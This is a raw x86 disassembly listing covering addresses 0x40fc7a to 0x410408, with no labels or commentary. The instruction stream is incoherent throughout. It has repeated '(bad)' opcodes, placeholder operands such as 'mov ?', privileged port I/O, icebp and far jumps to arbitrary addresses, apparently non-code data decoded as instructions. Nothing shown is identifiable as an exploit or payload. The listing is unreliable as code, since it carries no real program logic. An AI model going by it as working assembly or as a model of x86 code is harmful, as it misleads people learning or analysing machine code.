  40fc7a:	push   0x986e352d
  40fc7f:	test   al,0x10
  40fc81:	fsub   DWORD PTR [ecx]
  40fc83:	mov    esi,0x680ffde8
  40fc88:	lea    ecx,[edi]
  40fc8a:	sub    al,0x6d
  40fc8c:	mov    edi,0xfb70f36
  40fc91:	loope  0x40fc63
  40fc93:	daa    
  40fc94:	mov    bh,0x87
  40fc96:	adc    DWORD PTR [ecx],ecx
  40fc98:	pop    eax
  40fc99:	icebp  
  40fc9a:	xor    eax,DWORD PTR [eax]
  40fc9c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc9e:	mov    ah,0x5f
  40fca0:	imul   ebp,esp,0xfffffff8
  40fca3:	or     BYTE PTR [esi],al
  40fca5:	loope  0x40fc6a
  40fca7:	in     al,dx
  40fca8:	mov    edi,DWORD PTR [ebp-0x4cb97fe1]
  40fcae:	shr    ebp,0xb3
  40fcb1:	cmp    eax,0xbbcf3627
  40fcb6:	imul   ebx,DWORD PTR [edx-0x3be2c324],0xb2379885
  40fcc0:	mov    bh,0xa0
  40fcc2:	icebp  
  40fcc3:	mov    DWORD PTR [ebp-0x6e],ebx
  40fcc6:	pop    edx
  40fcc7:	in     al,dx
  40fcc8:	scas   eax,DWORD PTR es:[edi]
  40fcc9:	dec    edi
  40fcca:	sbb    eax,0xebd4828c
  40fccf:	ins    BYTE PTR es:[edi],dx
  40fcd0:	pushf  
  40fcd1:	xlat   BYTE PTR ds:[ebx]
  40fcd2:	push   ebp
  40fcd3:	and    BYTE PTR [edi],al
  40fcd5:	push   es
  40fcd6:	mov    ?,WORD PTR [edx+0x14d2bc6e]
  40fcdc:	mov    BYTE PTR [eax],al
  40fcde:	push   ds
  40fcdf:	fsub   QWORD PTR [eax+0x3c9e7fba]
  40fce5:	adc    BYTE PTR [edi],ch
  40fce7:	sub    cl,BYTE PTR [esi]
  40fce9:	or     al,0xb3
  40fceb:	push   ebp
  40fcec:	call   0xa50dc08d
  40fcf1:	or     dl,ch
  40fcf3:	cld    
  40fcf4:	sahf   
  40fcf5:	aaa    
  40fcf6:	sub    al,0xe2
  40fcf8:	loope  0x40fd5c
  40fcfa:	xchg   DWORD PTR [ecx],ecx
  40fcfc:	add    eax,0x2d30be3c
  40fd01:	and    eax,0x47c00a92
  40fd06:	jno    0x40fd46
  40fd08:	ret    
  40fd09:	cli    
  40fd0a:	fwait
  40fd0b:	jnp    0x40fcca
  40fd0d:	push   es
  40fd0e:	ja     0x40fc9e
  40fd10:	xchg   ebp,eax
  40fd11:	int3   
  40fd12:	loop   0x40fd17
  40fd14:	cmp    BYTE PTR [edi-0x59],dl
  40fd17:	xor    DWORD PTR [edx-0x59aceb4a],esi
  40fd1d:	dec    edi
  40fd1e:	dec    ebx
  40fd1f:	xchg   edx,eax
  40fd20:	add    esp,esi
  40fd22:	jo     0x40fd50
  40fd24:	ja     0x40fd51
  40fd26:	xchg   ebp,eax
  40fd27:	(bad)  
  40fd28:	(bad)  
  40fd29:	jae    0x40fd2b
  40fd2b:	and    al,0x2f
  40fd2d:	cdq    
  40fd2e:	imul   eax,DWORD PTR [esi],0x889d98d6
  40fd34:	mov    esp,0xf0853487
  40fd39:	xor    DWORD PTR [ebx],ecx
  40fd3b:	in     eax,dx
  40fd3c:	mov    esi,0x840364c4
  40fd41:	out    dx,al
  40fd42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd43:	inc    esi
  40fd44:	fisub  WORD PTR cs:[ebp-0x4f]
  40fd48:	stos   BYTE PTR es:[edi],al
  40fd49:	pop    ebx
  40fd4a:	mov    WORD PTR [ebx+ebp*8+0x17434d68],es
  40fd51:	iret   
  40fd52:	ficom  WORD PTR [esi+0x4c25363d]
  40fd58:	inc    edx
  40fd59:	push   ecx
  40fd5a:	push   esi
  40fd5b:	cmovp  edx,DWORD PTR [esi+ecx*4]
  40fd5f:	repz fcomp QWORD PTR ss:[bp+si-0x5582]
  40fd66:	add    DWORD PTR ds:0x440549dd,esp
  40fd6c:	sub    BYTE PTR [edi-0x4],0xbc
  40fd70:	into   
  40fd71:	stos   BYTE PTR es:[edi],al
  40fd72:	mov    DWORD PTR [esi+0x24],0x5c0c954d
  40fd79:	leave  
  40fd7a:	pop    ss
  40fd7b:	out    0x2d,eax
  40fd7d:	pop    es
  40fd7e:	sub    BYTE PTR [edi],0xfe
  40fd81:	push   ecx
  40fd82:	ss in  al,dx
  40fd84:	aaa    
  40fd85:	int3   
  40fd86:	xchg   edi,eax
  40fd87:	les    esi,FWORD PTR [ebx-0x2bdf684]
  40fd8d:	xchg   ecx,eax
  40fd8e:	test   al,0xc8
  40fd90:	mov    al,0x99
  40fd92:	push   ds
  40fd93:	or     DWORD PTR [ebp-0x2b2950e5],ebx
  40fd99:	shl    BYTE PTR [ebp-0x79],cl
  40fd9c:	cmp    eax,0x233b07d6
  40fda1:	mov    dl,0x2f
  40fda3:	push   esp
  40fda4:	retf   0xe354
  40fda7:	jp     0x40fdda
  40fda9:	jo     0x40fe26
  40fdab:	push   0xffffff9f
  40fdad:	ja     0x40fdbe
  40fdaf:	pop    edx
  40fdb0:	aaa    
  40fdb1:	popf   
  40fdb2:	dec    esp
  40fdb3:	mov    bl,0x4d
  40fdb5:	adc    BYTE PTR [edi],bh
  40fdb7:	xor    BYTE PTR [ebx+0x36f190a3],ah
  40fdbd:	push   ecx
  40fdbe:	dec    edi
  40fdbf:	and    BYTE PTR [edx+0x37b4a148],al
  40fdc5:	push   edi
  40fdc6:	mov    eax,0xe0c3fc4c
  40fdcb:	lds    eax,FWORD PTR [edx-0x67]
  40fdce:	sub    esi,DWORD PTR [edx]
  40fdd0:	js     0x40fda5
  40fdd2:	rcl    eax,cl
  40fdd4:	int3   
  40fdd5:	jp     0x40fdb9
  40fdd7:	push   esp
  40fdd8:	out    0x73,eax
  40fdda:	icebp  
  40fddb:	ja     0x40fe42
  40fddd:	inc    sp
  40fddf:	xchg   ebp,eax
  40fde0:	les    esp,FWORD PTR [esi]
  40fde2:	ds int3 
  40fde4:	mov    ebp,edi
  40fde6:	enter  0xe9d3,0x5f
  40fdea:	adc    DWORD PTR [ebp+0x7a89e1db],edx
  40fdf0:	adc    dl,BYTE PTR [edi+0x5b]
  40fdf3:	loope  0x40fdf5
  40fdf5:	int3   
  40fdf6:	sub    BYTE PTR [edx],dl
  40fdf8:	push   ss
  40fdf9:	mov    eax,0xa8002343
  40fdfe:	push   ebp
  40fdff:	call   0xec99:0xb6fa79a6
  40fe06:	xor    eax,0xbbc9caa7
  40fe0b:	pop    ebp
  40fe0c:	mov    esp,0xac70ab1b
  40fe11:	lods   eax,DWORD PTR ds:[esi]
  40fe12:	call   0x308b369e
  40fe17:	mov    al,ds:0x120f7543
  40fe1c:	mov    edi,0xdeee6c57
  40fe21:	add    ch,BYTE PTR [edx]
  40fe23:	fcmovu st,st(3)
  40fe25:	sbb    bl,BYTE PTR [ecx]
  40fe27:	jg     0x40fe08
  40fe29:	fst    QWORD PTR [eax+0x470764c5]
  40fe2f:	pop    ecx
  40fe30:	and    DWORD PTR ds:0x93f73564,eax
  40fe36:	push   ebp
  40fe37:	icebp  
  40fe38:	cld    
  40fe39:	and    bl,0x84
  40fe3c:	add    eax,DWORD PTR [edi+0x4dbb3780]
  40fe42:	in     eax,0x4e
  40fe44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe45:	jg     0x40fe7f
  40fe47:	push   esi
  40fe48:	shl    BYTE PTR [esi-0x2f],0xb1
  40fe4c:	mov    ah,0x21
  40fe4e:	cld    
  40fe4f:	loopne 0x40fe85
  40fe51:	sbb    eax,0x8d690984
  40fe56:	std    
  40fe57:	mov    BYTE PTR [ebp+0x148cb55c],cl
  40fe5d:	icebp  
  40fe5e:	adc    al,0x30
  40fe60:	je     0x40fe3e
  40fe62:	adc    DWORD PTR [eax],eax
  40fe64:	sub    DWORD PTR [ecx+0x38b02d3b],0x2fa9badb
  40fe6e:	cs cmp al,0xcb
  40fe71:	rcl    BYTE PTR [ecx-0x7ef2b1b],1
  40fe77:	dec    edi
  40fe78:	pushf  
  40fe79:	ja     0x40fe2a
  40fe7b:	sub    al,0x7b
  40fe7d:	jbe    0x40fea8
  40fe7f:	int    0xf6
  40fe81:	or     ebx,DWORD PTR [ebp+0x4df82562]
  40fe87:	xor    ch,BYTE PTR [edx-0x3e]
  40fe8a:	mov    ds:0x76cda34d,al
  40fe8f:	inc    eax
  40fe90:	cmp    al,0xe0
  40fe92:	inc    ecx
  40fe93:	push   edx
  40fe94:	aas    
  40fe95:	(bad)  [ecx+0x1f1411e8]
  40fe9b:	sahf   
  40fe9c:	mov    edx,0x4d0ca336
  40fea1:	dec    esi
  40fea2:	retf   
  40fea3:	pushf  
  40fea4:	and    bl,ch
  40fea6:	imul   eax,DWORD PTR [ebp-0x61],0xefabf44f
  40fead:	hlt    
  40feae:	mov    bh,dh
  40feb0:	fld    TBYTE PTR [edx+ebp*4+0x6263d4e1]
  40feb7:	add    al,0xeb
  40feb9:	lea    ebx,[edi+0x7e]
  40febc:	popa   
  40febd:	ja     0x40fe9f
  40febf:	add    eax,esi
  40fec1:	iret   
  40fec2:	fild   WORD PTR [edx+0x25]
  40fec5:	sar    ebx,0x20
  40fec8:	retf   0x802c
  40fecb:	sbb    ch,dh
  40fecd:	loope  0x40feca
  40fecf:	mov    esp,0x2c47a784
  40fed4:	jl     0x40fed6
  40fed6:	jne    0x40ff45
  40fed8:	scas   al,BYTE PTR es:[edi]
  40fed9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feda:	daa    
  40fedb:	xor    bh,bh
  40fedd:	pop    es
  40fede:	aad    0xa7
  40fee0:	mov    ds:0xab874441,eax
  40fee5:	ja     0x40fea3
  40fee7:	fmul   DWORD PTR [ecx-0x61]
  40feea:	(bad)  
  40feeb:	pop    esp
  40feec:	jmp    0x8f244ef4
  40fef1:	gs jle 0x40ff65
  40fef4:	lods   al,BYTE PTR ds:[esi]
  40fef5:	cmp    DWORD PTR [eax+0x4a3f3bba],0xfffffff3
  40fefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fefd:	sub    al,0x4
  40feff:	pop    esi
  40ff00:	xor    ebx,esp
  40ff02:	xor    edx,eax
  40ff04:	in     al,0xb0
  40ff06:	add    eax,DWORD PTR [ebx-0x5362b1e4]
  40ff0c:	and    al,0x64
  40ff0e:	dec    esp
  40ff0f:	ins    BYTE PTR es:[edi],dx
  40ff10:	hlt    
  40ff11:	sbb    BYTE PTR [edi-0x6a630d89],bl
  40ff17:	stos   BYTE PTR es:[edi],al
  40ff18:	enter  0x1d13,0x1f
  40ff1c:	mov    ch,0xa2
  40ff1e:	xor    eax,0xd47e2a9b
  40ff23:	(bad)  
  40ff24:	leave  
  40ff25:	or     ch,BYTE PTR [edi]
  40ff27:	sub    al,0x14
  40ff29:	in     al,0x7f
  40ff2b:	pop    es
  40ff2c:	pop    edi
  40ff2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff2e:	test   DWORD PTR [ebx-0x4e5638e4],ecx
  40ff34:	dec    eax
  40ff35:	stos   DWORD PTR es:[edi],eax
  40ff36:	fs call 0x8a39:0x74ab51b7
  40ff3e:	dec    esi
  40ff3f:	mov    ecx,0x234cb008
  40ff44:	out    0x0,al
  40ff46:	xor    al,0x75
  40ff48:	stc    
  40ff49:	cmp    eax,0xdf978b4e
  40ff4e:	pop    edx
  40ff4f:	add    DWORD PTR [ecx-0x2416866e],0x56cc83ab
  40ff59:	push   ds
  40ff5a:	mov    dl,0x3c
  40ff5c:	adc    BYTE PTR [edx-0x4e75ca79],al
  40ff62:	das    
  40ff63:	inc    esi
  40ff64:	cmp    al,BYTE PTR [ecx-0x43]
  40ff67:	and    al,0xb7
  40ff69:	test   eax,0x8b402f9e
  40ff6e:	call   0x800da776
  40ff73:	ret    
  40ff74:	sub    ebx,DWORD PTR [ebx]
  40ff76:	xor    eax,0x6dc1bd64
  40ff7b:	sahf   
  40ff7c:	jo     0x40ff78
  40ff7e:	push   0xd8df73bc
  40ff83:	xor    DWORD PTR [edi+0x76],esi
  40ff86:	adc    al,0x72
  40ff88:	mov    bh,0xdc
  40ff8a:	outs   dx,BYTE PTR ds:[esi]
  40ff8b:	and    al,BYTE PTR [ebp-0x5cd33808]
  40ff91:	(bad)  
  40ff93:	pop    ss
  40ff94:	mov    ecx,0x15d60dd3
  40ff99:	lds    edi,FWORD PTR [ebx-0xa8b712f]
  40ff9f:	fistp  DWORD PTR [ebp+0x52]
  40ffa2:	mov    fs:0xdeb612fc,al
  40ffa8:	or     DWORD PTR [edi+0x52],esp
  40ffab:	sbb    ah,dh
  40ffad:	xor    DWORD PTR [edx+0x4c],esi
  40ffb0:	or     ebx,ecx
  40ffb2:	xchg   esp,eax
  40ffb3:	push   ss
  40ffb4:	cli    
  40ffb5:	clc    
  40ffb6:	cmp    BYTE PTR [ecx+0x14],bl
  40ffb9:	popa   
  40ffba:	mul    DWORD PTR [ebx-0x70]
  40ffbd:	lods   eax,DWORD PTR ds:[esi]
  40ffbe:	pop    es
  40ffbf:	mov    ch,0xeb
  40ffc1:	mov    es,esp
  40ffc3:	mov    cl,0x4
  40ffc5:	sar    ebx,0x6b
  40ffc8:	sub    BYTE PTR [edi-0x67],bh
  40ffcb:	icebp  
  40ffcc:	adc    al,0x90
  40ffce:	lock cmp ah,BYTE PTR [eax+edi*2]
  40ffd2:	pop    edi
  40ffd3:	enter  0xbb3f,0xa1
  40ffd7:	mov    ebx,0x2d5dfbf6
  40ffdc:	into   
  40ffdd:	push   eax
  40ffde:	loopne 0x40ffa4
  40ffe0:	ret    
  40ffe1:	call   0x9f5cf0c0
  40ffe6:	shl    eax,1
  40ffe8:	test   al,0xab
  40ffea:	int    0x76
  40ffec:	push   eax
  40ffed:	inc    esi
  40ffee:	xor    ah,BYTE PTR [edx+0x67142a87]
  40fff4:	sar    DWORD PTR [ebx],0x6a
  40fff7:	dec    ebp
  40fff8:	dec    ebx
  40fff9:	je     0x41006b
  40fffb:	sbb    edx,DWORD PTR [eax-0x6c]
  40fffe:	mov    ecx,0xe6062755
  410003:	mov    dl,0x4f
  410005:	sub    eax,0x693b4a7d
  41000a:	mov    es,WORD PTR [esp+ebp*1-0x5a]
  41000e:	or     al,0x5c
  410010:	inc    edi
  410011:	fwait
  410012:	scas   eax,DWORD PTR es:[edi]
  410013:	push   esp
  410014:	mov    BYTE PTR [eax+0x8],0x81
  410018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410019:	or     al,cl
  41001b:	xor    DWORD PTR [ecx],ebx
  41001d:	pusha  
  41001e:	std    
  41001f:	lahf   
  410020:	inc    eax
  410021:	sbb    BYTE PTR [ebp-0x7f],bh
  410024:	xor    DWORD PTR [eax],ebx
  410026:	imul   BYTE PTR [ebp-0x70]
  410029:	(bad)  
  41002a:	sahf   
  41002b:	dec    esp
  41002c:	sub    ecx,ecx
  41002e:	or     DWORD PTR [ebp-0x5a27df37],eax
  410034:	dec    ebp
  410035:	xlat   BYTE PTR ds:[ebx]
  410036:	cwde   
  410037:	push   ebp
  410038:	aam    0xd8
  41003a:	out    0x6e,eax
  41003c:	dec    edx
  41003d:	and    BYTE PTR [ecx-0x7c],al
  410040:	or     DWORD PTR [edx+0x21abf1fd],0xf99dc4ce
  41004a:	dec    eax
  41004b:	mul    DWORD PTR [edx+0x27]
  41004e:	jmp    0x64a4d761
  410053:	dec    BYTE PTR [esi]
  410055:	and    al,0x7b
  410057:	clc    
  410058:	imul   ebx,ebp,0xffffffe8
  41005b:	rcr    edi,1
  41005d:	xchg   edi,eax
  41005e:	scas   al,BYTE PTR es:[edi]
  41005f:	or     al,0x9f
  410061:	and    BYTE PTR [edx-0x3539b64a],0x5e
  410068:	and    BYTE PTR [esi],bl
  41006a:	enter  0xab44,0xb8
  41006e:	test   al,0xf3
  410070:	adc    DWORD PTR [ebp+0x5edbafe8],ebx
  410076:	int    0x13
  410078:	sub    eax,0x58774e21
  41007d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41007e:	jnp    0x4100d5
  410080:	js     0x410061
  410082:	xchg   BYTE PTR [edi+0x57630f54],bh
  410088:	push   ds
  410089:	dec    ebx
  41008a:	cdq    
  41008b:	neg    DWORD PTR [esp+ebp*1+0xc4939d3]
  410092:	mov    bh,0x2d
  410094:	iret   
  410095:	or     dl,BYTE PTR [edx-0x36f4cfe5]
  41009b:	or     BYTE PTR [ecx],dh
  41009d:	fdiv   QWORD PTR [ebp-0x43ed98aa]
  4100a3:	jp     0x410095
  4100a5:	pop    es
  4100a6:	mov    bh,0xd4
  4100a8:	jne    0x410059
  4100aa:	scas   al,BYTE PTR es:[edi]
  4100ab:	outs   dx,BYTE PTR ds:[esi]
  4100ac:	jnp    0x410048
  4100ae:	mov    ah,BYTE PTR [edi]
  4100b0:	test   ch,cl
  4100b2:	or     dh,ch
  4100b4:	les    ecx,FWORD PTR [edx-0x3ffe08b4]
  4100ba:	sar    ebp,0xc1
  4100bd:	shl    BYTE PTR [ecx-0x5b84a874],0xf7
  4100c4:	stc    
  4100c5:	mov    esp,0x55768ab8
  4100ca:	xlat   BYTE PTR ds:[ebx]
  4100cb:	out    0x2a,eax
  4100cd:	mov    edi,0x66e48265
  4100d2:	xchg   ecx,eax
  4100d3:	mov    ebp,0x7b02ccd
  4100d8:	sub    al,0xce
  4100da:	push   ebx
  4100db:	(bad)  
  4100dc:	loopne 0x4100dd
  4100de:	jnp    0x410136
  4100e0:	pusha  
  4100e1:	inc    edx
  4100e2:	(bad)  
  4100e4:	bound  esp,QWORD PTR [eax*8+0x1d3479cc]
  4100eb:	and    edx,esi
  4100ed:	call   FWORD PTR [esi-0x31d20842]
  4100f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f4:	sbb    BYTE PTR [esi-0x73],ah
  4100f7:	je     0x4100f1
  4100f9:	or     eax,0x52be8da1
  4100fe:	(bad)  
  4100ff:	fdiv   DWORD PTR [edi+0x35b51b7f]
  410105:	mov    ds:0x3914e457,al
  41010a:	push   cs
  41010b:	addr16 push ebp
  41010d:	cwde   
  41010e:	adc    ecx,edx
  410110:	arpl   sp,di
  410112:	test   eax,0xfad100e8
  410117:	push   edi
  410118:	mov    esp,0x90843864
  41011d:	jg     0x4100d3
  41011f:	aam    0x4c
  410121:	cmp    eax,0xb352a8ad
  410126:	mov    ah,0x37
  410128:	mov    ?,esp
  41012a:	fcomi  st,st(6)
  41012c:	fdivr  QWORD PTR [ecx+eax*4]
  41012f:	out    dx,eax
  410130:	mov    edi,0xb69d53e9
  410135:	pop    ss
  410136:	popf   
  410137:	jmp    0x32d5a11
  41013c:	jl     0x410164
  41013e:	push   esi
  41013f:	idiv   DWORD PTR [edi+ecx*1]
  410142:	or     edx,DWORD PTR [ebx+0x26b1a955]
  410148:	mov    edi,0x10bf703b
  41014d:	mov    es,WORD PTR [edi]
  41014f:	jl     0x410130
  410151:	push   esi
  410152:	sub    BYTE PTR [eax],bh
  410154:	popa   
  410155:	iret   
  410156:	loop   0x41010e
  410158:	push   eax
  410159:	jnp    0x4101d7
  41015b:	mov    bh,0x10
  41015d:	cmp    DWORD PTR [ecx-0x39],esp
  410160:	pop    edx
  410161:	push   es
  410162:	daa    
  410163:	lock push 0x66b6c9e8
  410169:	sti    
  41016a:	push   esp
  41016b:	fcmovnu st,st(6)
  41016d:	xor    cl,dl
  41016f:	mov    ah,0xa7
  410171:	fistp  QWORD PTR [edi]
  410173:	aas    
  410174:	pop    edi
  410175:	fs ins DWORD PTR es:[edi],dx
  410177:	jae    0x4101da
  410179:	mov    al,ds:0xe1ebdd32
  41017e:	cdq    
  41017f:	cld    
  410180:	adc    ecx,DWORD PTR [edi+0x5d5f21fe]
  410186:	ja     0x4101e2
  410188:	mov    edx,0x60390b32
  41018d:	retf   
  41018e:	pop    edi
  41018f:	ins    BYTE PTR es:[edi],dx
  410190:	jmp    0x410143
  410192:	jle    0x41020c
  410194:	xlat   BYTE PTR ds:[ebx]
  410195:	sbb    esp,DWORD PTR [ebx+0x38]
  410198:	jl     0x41015f
  41019a:	jmp    0x7e24:0x60daff4d
  4101a1:	push   cs
  4101a2:	inc    edi
  4101a3:	and    eax,0x781f6e71
  4101a8:	pop    esp
  4101a9:	rol    BYTE PTR [eax+0x47],cl
  4101ac:	pop    es
  4101ad:	(bad)  [ecx]
  4101af:	mov    eax,ss:0x815e3b67
  4101b5:	out    dx,al
  4101b6:	push   edx
  4101b7:	and    DWORD PTR [esi-0x1dd8b84a],edi
  4101bd:	mov    ah,0x71
  4101bf:	add    BYTE PTR [ebx+0x52],bl
  4101c2:	inc    ecx
  4101c3:	mov    fs,WORD PTR [ecx]
  4101c5:	adc    BYTE PTR [ebx-0x73],ah
  4101c8:	push   ax
  4101ca:	mov    dl,0x7a
  4101cc:	retf   0xb311
  4101cf:	xor    eax,0xc83cb02
  4101d4:	in     al,0xd0
  4101d6:	add    al,0xb0
  4101d8:	push   0x48
  4101da:	test   al,0x28
  4101dc:	nop
  4101dd:	leave  
  4101de:	je     0x41016e
  4101e0:	fisubr WORD PTR [ebp+0x7d58d0a2]
  4101e6:	std    
  4101e7:	stc    
  4101e8:	pop    ebx
  4101e9:	jae    0x410229
  4101eb:	jo     0x410200
  4101ed:	lds    edi,FWORD PTR [ecx]
  4101ef:	cwde   
  4101f0:	ss stos BYTE PTR es:[edi],al
  4101f2:	hlt    
  4101f3:	jns    0x410259
  4101f5:	pop    ecx
  4101f6:	or     al,0x59
  4101f8:	repz inc eax
  4101fa:	jns    0x4101f6
  4101fc:	in     al,dx
  4101fd:	and    ebp,ecx
  4101ff:	rcr    DWORD PTR [edx+0x7c],cl
  410202:	add    al,0x2
  410204:	push   ds
  410205:	int3   
  410206:	or     ch,BYTE PTR [edi+0x7e195b09]
  41020c:	add    eax,0xacbe9ceb
  410211:	out    dx,al
  410212:	mov    BYTE PTR [edi+0x38c6429f],0x81
  410219:	pop    ebx
  41021a:	inc    ecx
  41021b:	inc    ecx
  41021c:	test   al,0x83
  41021e:	sbb    esp,DWORD PTR [eax*2-0x74f8ab9b]
  410225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410226:	fidivr DWORD PTR [esi+0x2b]
  410229:	ret    
  41022a:	push   ebx
  41022b:	cmp    ebp,DWORD PTR [esi]
  41022d:	rcr    DWORD PTR [ecx],1
  41022f:	daa    
  410230:	xlat   BYTE PTR ds:[ebx]
  410231:	xor    edx,DWORD PTR [eax]
  410233:	mov    al,0x9f
  410235:	jbe    0x4101d7
  410237:	cwde   
  410238:	mov    WORD PTR [ebx+0x4c765a88],es
  41023e:	neg    DWORD PTR [eax]
  410240:	mov    bl,0x74
  410242:	jecxz  0x4101e1
  410244:	push   eax
  410245:	bound  edx,QWORD PTR [edi]
  410247:	inc    esp
  410248:	jno    0x4101dc
  41024a:	xlat   BYTE PTR ds:[ebx]
  41024b:	pop    edx
  41024c:	scas   al,BYTE PTR es:[edi]
  41024d:	add    ebx,ebx
  41024f:	jecxz  0x4102a7
  410251:	xchg   edi,eax
  410252:	adc    eax,0x7dae65bc
  410257:	or     esp,DWORD PTR ss:[edi+0x45883cf]
  41025e:	pop    ebp
  41025f:	andnps xmm1,xmm1
  410262:	ins    DWORD PTR es:[edi],dx
  410263:	nop
  410264:	push   esi
  410265:	add    eax,0xd1570e80
  41026a:	pop    esp
  41026b:	dec    edi
  41026c:	popa   
  41026d:	ret    0xd0e9
  410270:	dec    ebp
  410271:	xchg   ebp,eax
  410272:	and    BYTE PTR [ebx+0x51],dh
  410275:	into   
  410276:	pop    ebx
  410277:	push   eax
  410278:	pushf  
  410279:	jp     0x4102c0
  41027b:	sub    ecx,edi
  41027d:	out    dx,al
  41027e:	pop    ecx
  41027f:	jo     0x41024e
  410281:	push   ecx
  410282:	and    eax,0x63d47cc7
  410287:	sub    DWORD PTR [ebp+ecx*8-0x20],ebp
  41028b:	clc    
  41028c:	sub    edx,DWORD PTR [ebx+0x6782b67]
  410292:	mov    dl,0x11
  410294:	push   0xcce0bd76
  410299:	xchg   BYTE PTR [edi+esi*8],bl
  41029c:	or     edx,ebx
  41029e:	(bad)  
  41029f:	jnp    0x4102b5
  4102a1:	(bad)  
  4102a2:	lea    edx,[esi-0x2784c9e4]
  4102a8:	fsubr  QWORD PTR [ebp+0x40]
  4102ab:	dec    esp
  4102ac:	jmp    0x4102d5
  4102ae:	push   ebx
  4102af:	sub    DWORD PTR [ebx-0x2dbc37ac],esi
  4102b5:	hlt    
  4102b6:	loopne 0x4102eb
  4102b8:	inc    esp
  4102b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102ba:	add    BYTE PTR [edi+0x36],al
  4102bd:	ror    BYTE PTR [ecx+edi*2-0x36a8ea12],cl
  4102c4:	add    eax,0xe4622c71
  4102c9:	ins    BYTE PTR es:[edi],dx
  4102ca:	inc    eax
  4102cb:	jno    0x410284
  4102cd:	into   
  4102ce:	inc    ebp
  4102cf:	es push edi
  4102d1:	es jns 0x4102a2
  4102d4:	pop    ss
  4102d5:	aam    0xeb
  4102d7:	jmp    0xa580bfdb
  4102dc:	scas   al,BYTE PTR es:[edi]
  4102dd:	mov    ds:0xf3a303ee,eax
  4102e2:	jb     0x410287
  4102e4:	loope  0x410334
  4102e6:	mov    bh,cl
  4102e8:	mov    BYTE PTR gs:[edx],al
  4102eb:	jmp    0xeec0:0x43f7c796
  4102f2:	imul   ebp,DWORD PTR [eax],0xb05ad7a0
  4102f8:	push   ebp
  4102f9:	xor    eax,0x43373e0d
  4102fe:	or     ch,BYTE PTR [ebp-0x4e896b7f]
  410304:	mov    ecx,0x58521e48
  410309:	sbb    dl,BYTE PTR [edx]
  41030b:	stos   BYTE PTR es:[edi],al
  41030c:	dec    eax
  41030d:	xchg   ebp,eax
  41030e:	add    al,0x4b
  410310:	xor    al,0x96
  410312:	mov    edx,0xb3c8b3a
  410317:	mov    cl,0x66
  410319:	inc    esi
  41031a:	pop    ebx
  41031b:	aad    0xc4
  41031d:	dec    edi
  41031e:	(bad)  
  41031f:	leave  
  410320:	addr16 sbb eax,0xbd5b14f7
  410326:	imul   ebp,ebx,0xffffffcd
  410329:	shl    dh,1
  41032b:	test   cl,0x54
  41032e:	cmp    al,0x55
  410330:	enter  0x1863,0xa7
  410334:	push   ds
  410335:	or     dl,BYTE PTR [ebx]
  410337:	outs   dx,DWORD PTR ds:[esi]
  410338:	adc    esi,eax
  41033a:	or     al,0xe8
  41033c:	lods   eax,DWORD PTR ds:[esi]
  41033d:	jmp    0x410337
  41033f:	test   BYTE PTR [ecx+0x1cfa210d],dh
  410345:	jo     0x4102d3
  410347:	shl    DWORD PTR [ebp+0x66],1
  41034a:	xor    DWORD PTR ds:0x5d35a102,0x5c
  410351:	mov    ebx,0xcf340c2e
  410356:	les    edi,FWORD PTR [ebx+0x15c46be2]
  41035c:	(bad)  
  41035d:	ror    ah,cl
  41035f:	scas   al,BYTE PTR es:[edi]
  410360:	or     BYTE PTR [edi],ch
  410362:	neg    DWORD PTR [eax]
  410364:	and    ah,ah
  410366:	mov    DWORD PTR [esi],edi
  410368:	xor    eax,0xc466dd81
  41036d:	or     ebp,esi
  41036f:	jecxz  0x410305
  410371:	pusha  
  410372:	inc    esi
  410373:	stc    
  410374:	adc    al,0x39
  410376:	xchg   edx,eax
  410377:	and    BYTE PTR [ecx+0x4f056537],dl
  41037d:	aaa    
  41037e:	mov    al,0x40
  410380:	sub    cl,0x2e
  410383:	addr16 or al,0xcd
  410386:	out    dx,eax
  410387:	sub    BYTE PTR [edx],ch
  410389:	or     DWORD PTR [edi-0x64],esp
  41038c:	cld    
  41038d:	rcl    DWORD PTR [esi+0xb655ea1],1
  410393:	adc    ch,BYTE PTR [ebx+eiz*4]
  410396:	mov    al,ds:0x405dc4c
  41039b:	call   0x813c2674
  4103a0:	js     0x41033a
  4103a2:	pushf  
  4103a3:	rcl    BYTE PTR [eax+0x22],cl
  4103a6:	mov    dl,0x4e
  4103a8:	les    eax,FWORD PTR [ebp+0x6c085fdc]
  4103ae:	es sbb bh,bl
  4103b1:	shl    BYTE PTR [eax-0xb],cl
  4103b4:	inc    eax
  4103b5:	xor    BYTE PTR [edx+0x12],0x9
  4103b9:	adc    eax,0xcbd4b677
  4103be:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4103c0:	(bad)  
  4103c1:	mov    ecx,0x4aacfb56
  4103c6:	outs   dx,BYTE PTR ds:[esi]
  4103c7:	pop    ds
  4103c8:	push   0xffffffe8
  4103ca:	mov    dl,0x8e
  4103cc:	stos   BYTE PTR es:[edi],al
  4103cd:	or     al,0xc3
  4103cf:	xchg   BYTE PTR [edi+0x51],bh
  4103d2:	outs   dx,BYTE PTR ds:[esi]
  4103d3:	and    eax,0xe6c55db3
  4103d8:	jae    0x410421
  4103da:	mov    dl,0x12
  4103dc:	sbb    al,0xd
  4103de:	call   0x669658d2
  4103e3:	das    
  4103e4:	(bad)  
  4103e5:	popf   
  4103e6:	fs mov dh,0x60
  4103e9:	xchg   edi,eax
  4103ea:	icebp  
  4103eb:	fnstcw WORD PTR [esi]
  4103ed:	mov    esi,DWORD PTR ds:0x3974f681
  4103f3:	out    0xab,eax
  4103f5:	(bad)  
  4103f6:	outs   dx,BYTE PTR ds:[esi]
  4103f7:	mov    bl,dh
  4103f9:	sar    BYTE PTR [edx-0x5f68c01e],0xd9
  410400:	sub    DWORD PTR [edi+0x35],0x6a
  410404:	fnstenv [ebp+0x39]
  410407:	stc    
  410408:	adc    ebx,DWORD PTR [ecx]
